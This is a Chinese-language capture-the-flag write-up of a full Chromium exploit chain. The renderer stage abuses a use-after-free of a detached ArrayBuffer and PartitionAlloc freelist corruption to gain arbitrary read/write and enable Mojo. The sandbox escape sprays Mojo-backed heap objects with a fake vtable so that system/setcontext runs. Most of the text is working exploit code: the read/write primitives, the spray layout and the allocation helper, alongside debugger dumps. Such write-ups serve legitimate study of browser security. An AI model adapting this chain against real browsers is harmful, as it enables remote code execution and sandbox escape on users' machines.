## 概览
rce+sbx。
通过rce来开启mojo，然后再sbx bypass。

## 调试方式
在需要调试的地方调用`debug()`函数
```
function debug(){
	for(let j = 0; j < 0x10000000; j++){
			var x = 1;
		for(let i = 0; i < 0x1000000; i++){
			var x = x + i;
		}
	}
}
```
然后另起一个控制台，用gdb attach render process,可用
```
gdb -p `ps axfh | grep type=renderer | grep chrome | awk '{print $1}' | head -1`
```
render process的调试方式可见https://chromium.googlesource.com/chromium/src/+/81c0fc6d4/docs/linux_debugging.md

##  利用
### render
和之前Chromium RCE类似，区别是少了一些native function，以及变成了PartitionAlloc
```
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+    const utarget = %RawDownCast<AttachedJSTypedArray>(target);
 
     const overloadedArg = arguments[0];
     try {
@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
-      const utypedArray =
-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+      const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);
 
       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
```

####  ArrayBuffer Neuter
> There is a well-known trick in browser security. Javascript allows buffers to be transferred from a source thread to a Worker thread, and the transferred buffers are not accessible (“neutered”) in the source thread. In Chrome, it would also release the buffer of the ArrayBuffer.

作用等价于释放array buffer。

```
const ENABLE_NATIVE = 0
function ArrayBufferDetach(ab) {
    if (ENABLE_NATIVE) {
        eval("%ArrayBufferDetach(ab);");
        return
    }
    let w = new Worker('');
    w.postMessage({ab: ab}, [ab]);
    w.terminate();
}
```

#### 泄露

```
function detachBuffer(x){ // x is the ArrayBuffer that we want to detach
    try{
        var w = new Worker("");
        w.postMessage("",[x]);     
        w.terminate();
    }catch(ex){
        console.log("exception when detaching")
    }
}

var victim = new Float64Array(10).fill(12.34);
detachBuffer(victim.buffer);

//////////
// do something
//////////
var leaks = new Float64Array(10);
var data = new Float64Array(10).fill(13.37);

leaks.set(victim,0); // read from detached buffer
victim.set(data,0)   // write to detached buffer

```

```
0x3b2e080a2c2d <Float64Array map = 0x3b2e08281ac1>
0x3b2e080a2be5 <ArrayBuffer map = 0x3b2e08280dc9>

```
free前
```
uaf Float64Array:

pwndbg> x/10gx 0x3e56080a2c2d-1
0x3e56080a2c2c:	0x080406e908281ac1	0x080a2be5080411a9
0x3e56080a2c3c:	0x0000000000000000	0x0000000000000008
0x3e56080a2c4c:	0x0000000000000001	0x000034d2eee04010 (backing store)
0x3e56080a2c5c:	0x0000000000000000	0x0000000000000000
0x3e56080a2c6c:	0x0804035d00000000	0x0000747474747474

```

```
uaf ArrayBuffer:

pwndbg> x/20gx 0x3e56080a2be5-1
0x3e56080a2be4:	0x080406e908280dc9	0x00000008080406e9
0x3e56080a2bf4:	0xeee0401000000000	0xa1a4d480000034d2
0x3e56080a2c04:	0x000000020000010b	0x0000000000000000
0x3e56080a2c14:	0x0000000000000000	0x0000001008040489
0x3e56080a2c24:	0x0000747474747474	0x080406e908281ac1
0x3e56080a2c34:	0x080a2be5080411a9	0x0000000000000000
0x3e56080a2c44:	0x0000000000000008	0x0000000000000001
0x3e56080a2c54:	0x000034d2eee04010 (backing store)	0x0000000000000000
0x3e56080a2c64:	0x0000000000000000	0x0804035d00000000
0x3e56080a2c74:	0x0000747474747474	0x080406e908280dc9

```
```
backing store:

pwndbg> x/10gx 0x000034d2eee04010
0x34d2eee04010:	0x0000747474747474	0x0000000000000000
0x34d2eee04020:	0x3040e0eed2340000	0x0000000000000000
0x34d2eee04030:	0x4040e0eed2340000	0x0000000000000000
0x34d2eee04040:	0x5040e0eed2340000	0x0000000000000000
0x34d2eee04050:	0x6040e0eed2340000	0x0000000000000000
```

#### PartitionAlloc Exploitation



super page布局
```
| Guard page (4KB) | Metadata page (4KB) | Guard pages (8KB) | Slot span | Slot span | ... | Slot span | Guard page (4KB) |

0x0000205284e00000 0x0000205284e01000 ---p  // Guard page (4KB)
0x0000205284e01000 0x0000205284e02000 rw-p  // Metadata page (4KB)
0x0000205284e02000 0x0000205284e04000 ---p  // Guard pages (8KB)
0x0000205284e04000 0x0000205284e18000 rw-p  // Slot span
0x0000205284e18000 0x0000205285000000 ---p  // Guard pages (4KB)
```
其中，metadata page中可以泄露chrome的基址。
之前在backing store中泄露的残留free块指针位于`Slot span`中, 
- 通过将该地址的末五位置0就可以得到 superpage的基地址。

- PartitionPage大小是0x4000，我们取出泄漏指针的末四位 >> 14就可以得到`PartitionPageIndex`

- PartitionPage基地址就是 `Index*0x4000 + superpage的基地址`

- MetadataArea的基地址就是 `superpage的基地址 + 0x1000`

- 当前的MetadataArea地址就是 `MetadataArea的基地址 + PartitionPageIndex * 0x20`

攻击链如下
![](https://upload-images.jianshu.io/upload_images/13348817-443b51848b33f1ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

当METADATA AREA的freelist指针成环后，我们就有了任意地址读写的能力了。通过我们下一次malloc就能拿到`METADATA AREA`块，通过改写`METADATA AREA`的freelist就能任意地址读写
>Arbitrary read consists of following steps:
> - Set first element in freelist to the destination address
> - Allocate an object. PartitionAlloc will do the “unlink”, by reading first pointer from the destination address and setting it to the  freelist. the object will be allocated at the destination address.
> - Read first element in freelist while decoding the value, this gives the leaked bytes.
> - Since the allocated object is initialized with zeroes, restore the value that was at the address by writing the leaked bytes to the allocated object.

```
function read64(rwHelper, addr) {
    rwHelper[0] = addr; // [1]
    var tmp = new BigUint64Array(1); // [2]
    tmp.buffer;
    gcPreventer.push(tmp);
    tmp[0] =  byteSwapBigInt(rwHelper[0]); // [3] [4]
    return tmp[0];
}
```

> Arbitrary write is implemented in the same manner:
> - backup the original address that was in the freelist
> - set first element in freelist to the destination address
> -  allocate an object. the object will be allocated at the destination address.
> - write value into object
> - fix freelist by setting address to the value that was backed up in the first step.
```
function write64(rwHelper, addr, value) {
    var backup = rwHelper[0]
    rwHelper[0] = addr;
    var tmp = new BigUint64Array(1);
    tmp.buffer;
    tmp[0] = value;
    gcPreventer.push(tmp);
    rwHelper[0] = backup;
}
```

最后启用`mojo`的[过程](https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html),需要改写`enabled_bindings`为0x2。
我们首先要拿到`g_frame_map `的指针，遍历能拿到当前`frame`的`RenderFrame`
```
frame_map_ptr = chrome_base + 0xaa693a8n
console.log("chrome base @ "+ hex(chrome_base))
console.log("g_frame_map @ "+ hex(frame_map_ptr))

frame_map_ptr += 0x8n;
begin_ptr = read64(freelist,frame_map_ptr);
console.log("begin_ptr @ "+ hex(begin_ptr))

node_ptr = read64(freelist,begin_ptr+0x28n);
console.log("node_ptr @ "+hex(node_ptr));

render_frame_ptr = node_ptr;
//render_frame_ptr = read64(freelist,render_frame_ptr1);
console.log("render_frame_ptr @ "+hex(render_frame_ptr));



enabled_bindings = render_frame_ptr + 0x580n;
console.log("enabled_bindings @ "+hex(enabled_bindings));

write64(freelist,enabled_bindings,0x2n);
```
当改写mojo标志后，需要重新加载页面才能生效。为了保持freelist不崩溃，我们把freelist还原为原始的数值
```
console.log("go reload!!!");
freelist[0] = page_leak;
leaks[0] = (0n).i2f()
uaf.set(leaks,0);   
window.location.reload();
```
### Sandbox
先准备若干objects
```
var spray_inst = [];

for(var i = 0; i < 3000; i++){


        var x = new blink.mojom.TStoragePtr();
        Mojo.bindInterface(blink.mojom.TStorage.name,  mojo.makeRequest(x).handle);

        await x.init();
        var z = (await x.createInstance()).instance;

        spray_inst.push({"stor":x,"inst":z});
}
```
而后释放spray_inst 中的指针
```
for(var i =0; i < 3000; i++){
        if((i % 300 )== 0){continue;}
        await spray_inst[i]["stor"].ptr.reset();

}
```
堆喷的实现https://theori.io/research/escaping-chrome-sandbox/

批量申请0x700的堆块，写入构造好的对象结构
- vtable ptr points to our controlled memory
- inlined properties used for GetDouble & GetInt are filled with marker objects. We can read from them in order too understand if the memory was reclaimed successfully or not.
- queue that is used for push/pop operations points to global section in libc. There we will write fake vtable

即把pop/push的指针指向预设的bss地址，这样当我们通过push/pop方法时就能改写bss地址内容。  
改写vtable地址为我们预设的bss地址，bss内容可控
修改double和int的属性值为预设的marker值，这样通过遍历spray_inst中对象的`GetDouble`和`GetInt`结果，如果发现和marker的值相同，说明已经分配到了被控的对象，通过push/pop改写bss内容为目标执行函数，再执行vtable函数即可。
```let allocate = getAllocationConstructor();

////////////////////////////


var atoi_addr = (await spray_inst[0]["stor"].getLibcAddress()).addr // provided leak
libc_base = atoi_addr - 0x40680;
libc_bss_addr = libc_base + 0x3eb000
system_ptr        = libc_base + 0x4f440;
setcontext        = libc_base + 0x520c7

console.log("libc base  @ "+hex(libc_base))
console.log("bss        @ "+hex(libc_bss_addr))
console.log("system_ptr @ "+hex(system_ptr))


let alloc_count = 0x1000;

let data = new ArrayBuffer(0x700); // spray size
let b64arr = new BigUint64Array(data);
let view = new DataView(data);


b64arr.fill(0x41414242434344n);
let sprayed_val = 0x41414242434344


var bss_offs = libc_bss_addr+0xae0;
console.log("writing to "+hex(bss_offs));

/* ROP */
b64arr[0] = BigInt(bss_offs-0x10);
b64arr[0xa8/8] = BigInt(system_ptr); // rcx, future rip
b64arr[0x68/8] = BigInt(bss_offs+8); // rdi



//view.setUint8(command.length,0x0);
b64arr[(0x670/8)] = BigInt(sprayed_val); // double offs
b64arr[(0x648/8)] = BigInt(bss_offs);

b64arr[(0x650/8)] = BigInt(bss_offs) // vtable things
b64arr[(0x658/8)] = BigInt(bss_offs)
b64arr[(0x660/8)] = BigInt(0n)


/////////////

// bug trigger code is here, just not shown in this snippet :)

////////////

await (Array(alloc_count).fill().map(() => allocate(data))) // go reclaim!

for(var i = 0; i < spray_inst.length-1; i++){
        var tmp = (await spray_inst[i]["inst"].getDouble()).value.f2i()
        //console.log("i->"+ i + " " + tmp.toString(16));
        if(BigInt(tmp) == sprayed_val && (used_indexes.indexOf(i) == -1)){
                used_indexes.push(i);
                console.log("siced");
                (await spray_inst[i]["inst"].push(setcontext)); // push writes to bss
                (await spray_inst[i]["inst"].push(0x2a67616c662f2e)); // "./flag*"
                (await spray_inst[i]["inst"].getTotalSize());
                break top;
        }
}
```
其中，`getAllocationConstructor`实现如下
```
function getAllocationConstructor() {
        let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
        Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                            mojo.makeRequest(blob_registry_ptr).handle, "process", true);

        function Allocation(size=0x700) {
          function ProgressClient(allocate) {
            function ProgressClientImpl() {
            }
            ProgressClientImpl.prototype = {
              onProgress: async (arg0) => {
                if (this.allocate.writePromise) {
                  this.allocate.writePromise.resolve(arg0);
                }
              }
            };
            this.allocate = allocate;

            this.ptr = new mojo.AssociatedInterfacePtrInfo();
            var progress_client_req = mojo.makeRequest(this.ptr);
            this.binding = new mojo.AssociatedBinding(
              blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req
            );

            return this;
          }

          this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
          this.progressClient = new ProgressClient(this);
          blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
            this.serialized_blob = res.blob;
          })

          this.malloc = async function(data) {
            promise = new Promise((resolve, reject) => {
              this.writePromise = {resolve: resolve, reject: reject};
            });
            this.pipe.producer.writeData(data);
            this.pipe.producer.close();
            written = await promise;
            console.assert(written == data.byteLength);
          }

          this.free = async function() {
            this.serialized_blob.blob.ptr.reset();
            await sleep(1000);
          }

          this.read = function(offset, length) {
            this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
            this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
            return new Promise((resolve) => {
              this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
                result = new ArrayBuffer(length);
                this.readpipe.consumer.readData(result);
                this.watcher.cancel();
                resolve(result);
              });
            });
          }

          this.readQword = async function(offset) {
            let res = await this.read(offset, 8);
            return (new DataView(res)).getBigUint64(0, true);
          }

          return this;
        }

        async function allocate(data) {
          let allocation = new Allocation(data.byteLength);
          await allocation.malloc(data);
          return allocation;
        }
        return allocate;
     }
```

## murmur
本地调试的时候，在关闭`ENABLE_NATIVE`的时候，Neuter(即free array buffer)会失败，打印错误原因为`SecurityError: Failed to construct 'Worker'`
这是因为`Workers are restricted by the Same Origin Policy`，在打开`local file`或者`relative URL`的时候，不被允许创建`Worker`

可以在chrome的启动参数添加`--allow-file-access-from-files`,获取本地起服务器通过url来访问网页。
